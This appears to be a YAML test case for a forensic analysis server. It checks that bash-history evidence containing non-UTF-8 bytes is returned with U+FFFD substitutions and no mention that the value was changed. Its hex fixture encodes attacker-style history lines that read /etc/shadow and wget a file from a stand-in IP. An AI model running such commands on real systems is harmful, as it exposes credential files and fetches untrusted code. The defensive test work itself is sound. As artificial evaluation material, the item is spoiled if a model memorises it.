# Matrix case P4192-010: findevil reads evidence with
# errors="replace", so bytes that are not UTF-8 come back as U+FFFD with no
# note that the value was changed.
case_id: P4192-010
problem: P4192
server: findevil
variant: findevil-d1a8d25
commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
display: source-vs-result
level: mcp
realism: possible
realism_ko: "셸 기록에 UTF-8이 아닌 바이트가 섞이는 일(다른 인코딩 붙여넣기 등)은 있을 수 있다."
coverage: full
summary: A shell history line with two bytes that are not UTF-8 (FF FE) is returned with U+FFFD in their place, and the response does not say the value was changed.
summary_ko: "UTF-8이 아닌 두 바이트(FF FE)가 있는 셸 기록 줄이 그 자리에 U+FFFD가 들어간 채 돌아온다. 응답은 값이 바뀌었다고 말하지 않는다."
defect_ko: "이 서버는 해독하지 못한 바이트를 U+FFFD로 바꾼 값을 원래 값처럼 싣는다. 원래 값을 보이거나 바꿨다고 알려야 한다. 모델은 원래 바이트를 알 수 없고 바뀐 값을 증거 원문으로 잘못 안다."
setup_ko: "명령 두 줄 사이에 FF FE 바이트가 든 `.bash_history`를 넣었다."
fixture:
  - path: home/alice/.bash_history
    # "cat /etc/shadow\n" + FF FE + "wget http://203.0.113.7/x\n"
    hex: 636174202f6574632f736861646f770a fffe 776765742068747470 3a2f2f3230332e302e3131332e372f780a
steps:
  - tool: analyze_bash_history
    note_ko: "결함 호출: 셸 기록 분석"
    args:
      path: ${EVIDENCE}/home/alice/.bash_history
expect:
  - step: 1
    note_ko: "응답에 대체 문자 `�`가 들어 있다"
    contains: "�"
  - step: 1
    note_ko: "값을 바꿨다는 말이 없다"
    not_regex: "(?i)replac|not valid utf|invalid utf|undecod|U\\+FFFD"
